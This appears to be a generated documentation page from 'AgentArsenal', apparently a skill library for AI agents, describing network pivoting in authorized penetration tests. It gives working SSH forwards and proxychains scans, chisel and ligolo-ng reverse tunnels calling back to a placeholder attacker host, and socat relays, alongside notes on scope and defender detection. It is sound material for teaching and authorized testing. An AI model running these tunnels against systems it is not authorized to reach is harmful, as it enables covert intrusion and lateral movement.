@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: network-pivoting</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>network-pivoting</h2><div class="meta"><span class="badge gray">network</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when an authorized engagement gives you a foothold host and you must reach deeper network segments through it. Pivoting with SSH local, remote, and dynamic port forwarding, proxychains routing for proxyless tools, chisel TCP and UDP tunnels, ligolo-ng tun interfaces for full layer 3 access, and socat relays. Covers pivot architecture choices, agent versus agentless tradeoffs, keeping tunneled traffic stable and quiet, and the discovery loop that finds the next segment. Requires the recon-active baseline to know what to pivot toward.</p><div class="deps"><span class="kind">requires:</span> <a href="recon-active.html">recon-active</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <span class="muted">none</span></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>OpenSSH</td><td>9.x</td></tr><tr><td>proxychains</td><td>4.16</td></tr><tr><td>chisel</td><td>1.10.x</td></tr><tr><td>ligolo-ng</td><td>0.8.x</td></tr><tr><td>socat</td><td>1.8.x</td></tr><tr><td>ncat</td><td>7.98</td></tr></tbody></table><p>Pivoting routes your traffic through a compromised-in-scope host (the pivot) to reach networks you cannot see directly. It is the bridge between initial access and internal reconnaissance, and every tunnel you build must stay inside the authorized scope. This skill covers the practical toolkit: SSH forwarding for quick wins, proxychains to push arbitrary tools through a SOCKS proxy, chisel for fast encrypted tunnels, ligolo-ng when you need a real network interface on the far side, and socat for simple relays. All examples assume the pivot host is inside your authorized scope.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Enumerate from the pivot: its interfaces, routes, ARP table, and reachable neighbors.</li>
+<li>Choose the pivot method: SSH forwarding for simple port access, SOCKS plus proxychains for tool routing, chisel for speed, ligolo-ng for full network access.</li>
+<li>Establish the tunnel and verify it from your side with a simple probe.</li>
+<li>Route your enumeration tools through the tunnel (proxychains, or the tun interface).</li>
+<li>Discover the next segment and repeat, documenting every hop.</li>
+<li>Tear down tunnels cleanly at the end of the engagement.</li>
+</ol>
+<h2>1. Map from the pivot first</h2>
+<p>Before building tunnels, learn what the pivot can see. Its routing table and ARP cache are a map of the adjacent networks.</p>
+<pre><code class="language-bash">ip route show
+ip addr show
+arp -a
+cat /etc/resolv.conf
+ss -tlnp</code></pre>
+<p>Look for: extra interfaces (a second NIC often faces the internal network), routes to subnets you cannot reach directly, and ARP entries revealing live neighbors. Check what egress the pivot itself has, because your tunnel traffic must flow back through it:</p>
+<pre><code class="language-bash">ping -c 2 203.0.113.1
+curl -s -m 5 http://203.0.113.10/ -o /dev/null -w &quot;%{http_code}\n&quot;</code></pre>
+<h2>2. SSH port forwarding</h2>
+<p>SSH is the fastest pivot when you have SSH access to the foothold. Three modes cover most needs.</p>
+<p>Local forwarding exposes a far-side service on your local machine:</p>
+<pre><code class="language-bash">ssh -L 8080:192.168.11.20:80 -N -f pivotuser@203.0.113.10
+curl -s http://127.0.0.1:8080/ | head -20</code></pre>
+<p>Now the internal web server at 192.168.11.20:80 is reachable at your localhost:8080. Remote forwarding does the reverse: it exposes your local service on the far side, useful when the pivot cannot reach you directly:</p>
+<pre><code class="language-bash">ssh -R 9000:127.0.0.1:8000 -N -f pivotuser@203.0.113.10</code></pre>
+<p>Dynamic forwarding creates a SOCKS proxy on your machine; any SOCKS-aware tool can now route through the pivot:</p>
+<pre><code class="language-bash">ssh -D 1080 -N -f pivotuser@203.0.113.10
+curl -s --socks5 127.0.0.1:1080 http://192.168.11.20/ | head -20</code></pre>
+<p>Keep tunnels alive across flaky networks with keepalives in <code>~/.ssh/config</code>:</p>
+<pre><code>Host pivot
+    HostName 203.0.113.10
+    User pivotuser
+    ServerAliveInterval 30
+    ServerAliveCountMax 3</code></pre>
+<h2>3. proxychains: routing arbitrary tools</h2>
+<p>Many tools do not speak SOCKS. proxychains forces their TCP connections through your SOCKS proxy by preloading a library. Configure it once:</p>
+<pre><code class="language-bash">cat /etc/proxychains4.conf | grep -v &quot;^#&quot; | grep -v &quot;^$&quot;</code></pre>
+<p>Ensure the last line reads <code>socks5 127.0.0.1 1080</code> matching your dynamic forward. Then prefix any TCP tool:</p>
+<pre><code class="language-bash">proxychains nmap -sT -Pn --top-ports 100 192.168.11.0/24
+proxychains curl -s http://192.168.11.20/ | head -20</code></pre>
+<p>Rules that matter: proxychains only handles TCP, so UDP scans and ICMP ping will not work through it (use <code>-sT -Pn</code> with nmap). DNS through the proxy depends on the <code>proxy_dns</code> setting; enable it so name resolution also goes through the pivot. Expect slowness: every connection pays the tunnel cost, so reduce port counts and thread counts versus direct scans.</p>
+<h2>4. chisel: fast encrypted tunnels</h2>
+<p>chisel is a single static binary, easy to drop on a pivot, and it multiplexes many forwards over one encrypted connection. Run the server on your machine and the client on the pivot (or reverse it when the pivot cannot accept inbound connections).</p>
+<p>On your machine:</p>
+<pre><code class="language-bash">chisel server -p 8000 --reverse</code></pre>
+<p>On the pivot, a reverse client exposing an internal web server back to you:</p>
+<pre><code class="language-bash">./chisel client YOUR_IP:8000 R:8080:192.168.11.20:80</code></pre>
+<p>Now <code>http://127.0.0.1:8080</code> on your machine reaches the internal server. chisel also does SOCKS:</p>
+<pre><code class="language-bash">./chisel client YOUR_IP:8000 R:socks
+proxychains nmap -sT -Pn --top-ports 50 192.168.11.0/24</code></pre>
+<p>chisel&#x27;s <code>--reverse</code> flag lets the client define the forwards, which solves the common case where your machine is not reachable from the pivot but the pivot can reach you. Use authentication (<code>--auth user:pass</code>) so a stray chisel client cannot attach to your server.</p>
+<h2>5. ligolo-ng: a real interface on the far side</h2>
+<p>When SOCKS is not enough (you need ICMP, UDP scans, or tools that bypass proxychains), ligolo-ng gives you a tun interface with full layer 3 access. It has two parts: the proxy on your machine and the agent on the pivot.</p>
+<p>On your machine:</p>
+<pre><code class="language-bash">./proxy -selfcert</code></pre>
+<p>On the pivot:</p>
+<pre><code class="language-bash">./agent -connect YOUR_IP:11601 -ignore-cert</code></pre>
+<p>In the proxy console, select the session and start the tunnel:</p>
+<pre><code>session
+start --tun</code></pre>
+<p>Then add a route to the internal network through the new interface:</p>
+<pre><code class="language-bash">sudo ip route add 192.168.11.0/24 dev ligolo
+nmap -sn 192.168.11.0/24</code></pre>
+<p>Now ping, UDP scans, and unproxied tools work against the far network as if you were local. This is the most powerful option and the most visible one: a new network interface and routing changes on your machine are obvious in forensics, which is fine for authorized work and exactly why you document it.</p>
+<h2>6. socat relays for single ports</h2>
+<p>For a single TCP service with no SSH and no binary drops, socat on the pivot relays a port to the far side:</p>
+<pre><code class="language-bash">socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.11.20:80 &amp;
+curl -s http://203.0.113.10:8080/ | head -20</code></pre>
+<p>The <code>fork</code> flag handles multiple connections. This is unencrypted and has no authentication, so restrict it with firewall rules or bind to the pivot&#x27;s internal interface only, and only for the duration you need it. Kill the relay when done; forgotten relays are a finding against you in the report.</p>
+<h2>7. The discovery loop</h2>
+<p>Pivoting is iterative. Each new segment you reach gets the same treatment: enumerate interfaces and routes from the newest vantage point, look for the next network, and extend the tunnel chain. Document every hop (pivot IP, method, ports, purpose) in your notes; a tunnel diagram in the final report shows the client exactly how deep the authorized path went. When chaining multiple pivots, prefer one ligolo-ng tunnel per major segment over long chains of SSH forwards, because each extra hop multiplies latency and failure points.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>Double NAT and egress filtering may block your tunnel&#x27;s return traffic.</li>
+<p>Test with a simple TCP connection before assuming the tunnel works, and try common allowed ports (443, 53) for the tunnel transport.</p>
+<li>proxychains breaks tools that use raw sockets (SYN scans, OS detection).</li>
+<p>Always use connect scans (<code>-sT</code>) and skip host discovery (<code>-Pn</code>) through proxychains.</p>
+<li>chisel and ligolo-ng agents may be flagged by endpoint protection on the</li>
+<p>pivot. Check the rules of engagement for EDR testing boundaries; if running agents is out of scope, stay with SSH forwarding.</p>
+<li>SSH multiplexing (<code>ControlMaster</code>) reuses one connection for many</li>
+<p>forwards and avoids repeated authentication. Set it up when you need several simultaneous forwards.</p>
+<li>Tunnels die silently on network hiccups. Wrap long-running tunnels in</li>
+<p>autossh or a reconnect loop, and verify with a periodic probe rather than discovering the outage mid-scan.</p>
+<li>IPv6-only far networks need v6-capable tools end to end; test name</li>
+<p>resolution and routing for v6 explicitly instead of assuming.</p>
+</ul>
+<h2>Escalation</h2>
+<p>When the pivot cannot run your tools: use agentless methods (SSH forwarding, socat relays) instead of dropping binaries. When the pivot has no SSH and no shell for uploads, look for existing services to abuse as relays (a web shell is not in scope for this skill; coordinate with the exploitation phase). When one pivot cannot see the next segment, check for multi-homed hosts, routers, or jump boxes visible from the pivot and move the tunnel endpoint there. When bandwidth through the chain is too low for scanning, pivot your methodology instead: enumerate lightly through the tunnel to pick targets, then request a better-positioned vantage point from the client contact. Never pivot into networks outside the signed scope, no matter how tempting the route looks.</p>
+<h2>Detection and defender view</h2>
+<p>Defenders see pivoting as lateral movement infrastructure. SSH forwarding shows as long-lived SSH sessions with unusual port bindings; monitor for <code>-R</code> forwards exposing internal ports externally. chisel and ligolo-ng have recognizable TLS fingerprints and default ports that IDS rules flag. proxychains itself is client side and invisible, but the scanned traffic coming from the pivot&#x27;s IP is not. socat relays appear as listening ports with no associated service. The blue team differentiates authorized pivoting by the source, the time window, and your coordination: tell the defensive contact which pivot hosts and methods you will use before you start. Unexpected tunnels during an engagement trigger incident response, even when the engagement is authorized.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1090 Proxy</li>
+<li>MITRE ATT&amp;CK T1090.001 Internal Proxy</li>
+<li>MITRE ATT&amp;CK T1572 Protocol Tunneling</li>
+<li>MITRE ATT&amp;CK T1105 Ingress Tool Transfer</li>
+<li>MITRE ATT&amp;CK T1021.004 SSH</li>
+<li>CWE-200 Exposure of Sensitive Information to an Unauthorized Actor</li>
+<li>OpenSSH manual: https://man.openbsd.org/ssh</li>
+<li>chisel docs: https://github.com/jpillora/chisel</li>
+<li>ligolo-ng docs: https://github.com/nicocha30/ligolo-ng</li>
+<li>proxychains-ng docs: https://github.com/rofl0r/proxychains-ng</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
